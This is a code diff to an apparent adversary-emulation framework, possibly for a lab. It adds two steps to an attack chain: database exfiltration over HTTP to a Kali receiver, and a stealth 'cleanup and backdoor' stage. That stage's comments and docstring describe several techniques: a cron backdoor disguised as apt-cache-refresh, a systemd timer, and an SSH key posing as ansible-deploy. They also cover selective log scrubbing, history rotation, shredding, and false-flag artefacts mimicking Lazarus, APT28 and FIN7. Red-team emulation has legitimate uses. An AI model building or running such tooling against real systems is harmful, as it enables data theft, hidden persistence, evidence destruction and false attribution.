@@ -141,6 +141,41 @@ STEP_META_ADVANCED: dict[str, dict] = {
         "techniques": ["T1546.004", "T1140", "T1078"],
         "color": "green",
     },
+    "advanced_exfiltration": {
+        "tactic": "TA0010 · Exfiltration",
+        # T1041 — Exfiltration Over C2 Channel (HTTP POST to kali receiver).
+        # T1567 — Exfiltration Over Web Service (one-shot HTTP server).
+        "techniques": ["T1041", "T1567"],
+        "color": "cyan",
+    },
+    "advanced_cleanup_backdoor": {
+        "tactic": "TA0005 · Defense Evasion · TA0003 · Persistence",
+        # Defense Evasion family:
+        # T1485     — Data Destruction (shred + free-space wipe on /tmp).
+        # T1070.002 — Clear Linux/Mac System Logs (SELECTIVE grep-out, not
+        #             truncation — the basic chain does truncation; advanced
+        #             intentionally avoids that fingerprint).
+        # T1070.003 — Clear Command History (ROTATION with believable
+        #             vinzenz commands rather than deletion — empty history
+        #             is itself a tell).
+        # T1070.004 — File Deletion (shred of staged artefacts).
+        # T1565.001 — Stored Data Manipulation (false-flag artefacts:
+        #             Lazarus AppleJeus magic header on apache, APT28
+        #             Cyrillic taunt on vinzenz_ws, FIN7 Cobalt-Strike-
+        #             profile staging script — misdirect attribution).
+        # Persistence family:
+        # T1053.003 — Scheduled Task/Job: Cron (apache backdoor via
+        #             /etc/cron.d/apt-cache-refresh, hourly).
+        # T1543.002 — Create or Modify System Process: Systemd Service
+        #             (vinzenz_ws lab-update-agent.service + .timer).
+        # T1098.004 — Account Manipulation: SSH Authorized Keys (extra
+        #             entry in vinzenz.fedora's authorized_keys masquerading
+        #             as ansible-deploy@cm-prod).
+        "techniques": ["T1485", "T1070.002", "T1070.003", "T1070.004",
+                       "T1565.001",
+                       "T1053.003", "T1543.002", "T1098.004"],
+        "color": "red",
+    },
 }
 def _step_meta(name: str, mode: str = "basic") -> dict:
     """Return the TTP-metadata dict for ``name`` under the requested ``mode``.
@@ -501,6 +536,49 @@ def _step_advanced_vinzenzws_privesc(ctx: Context) -> dict[str, Any]:
     }
 
 
+def _step_advanced_exfiltration(ctx: Context) -> dict[str, Any]:
+    from advanced_exfiltration import run as exfil_run
+
+    result = exfil_run(
+        root_sliver_session=ctx.state["root_sliver_session"],
+        vinzenz_beacon=ctx.state.get("vinzenz_beacon"),
+        results_dir=ctx.results_dir,
+    )
+    if not result.get("exfil_success"):
+        raise RuntimeError("Advanced DB exfiltration failed")
+    return result
+
+
+def _step_advanced_cleanup_backdoor(ctx: Context) -> dict[str, Any]:
+    """Final stealth-cleanup + backdoor step of the advanced chain.
+
+    Runs after exfiltration (PR #153). Reads the captured admin password
+    from vinzenz_ws, removes the loud persistence stagers, plants three
+    diverse stealth backdoors (apache cron + vinzenz_ws systemd timer +
+    vinzenz_ws SSH key), drops false-flag artefacts, selectively scrubs
+    the logs the attacker can reach, dilutes the ones they cannot
+    (postgres + NFLOG via volume noise), and secure-wipes the staged
+    artefacts. See advanced_cleanup_backdoor.py module docstring.
+
+    ``exfil_success`` is a soft prerequisite — we warn if it's False but
+    still run, because cleanup-after-failed-exfil is also a valid
+    operator choice (revert + retry the chain).
+    """
+    from advanced_cleanup_backdoor import run as cleanup_run
+
+    if not ctx.state.get("exfil_success"):
+        log.warning("[!] advanced_cleanup_backdoor: exfil_success absent/False — "
+                    "running cleanup anyway (operator may prefer to abort)")
+
+    return cleanup_run(
+        root_sliver_session   = ctx.state["root_sliver_session"],
+        vinzenz_beacon        = ctx.state["vinzenz_beacon"],
+        vinzenz_password_file = ctx.state.get("vinzenz_password_file",
+                                              "/tmp/.sys_update.lock"),
+        kali_host             = ctx.kali_host,
+    )
+
+
 # ---------------------------------------------------------------------------
 # Chain definition
 # ---------------------------------------------------------------------------
@@ -581,6 +659,17 @@ CHAIN_ADVANCED: list[Step] = [
         "advanced_vinzenzws_privesc",
         _step_advanced_vinzenzws_privesc,
         requires=("vinzenz_beacon",),
+    ),
+    Step(
+        "advanced_exfiltration",
+        _step_advanced_exfiltration,
+        requires=("root_sliver_session", "vinzenz_beacon"),
+    ),
+    Step(
+        "advanced_cleanup_backdoor",
+        _step_advanced_cleanup_backdoor,
+        requires=("root_sliver_session", "vinzenz_beacon"),
+        optional=True,
     ),
 ]
 
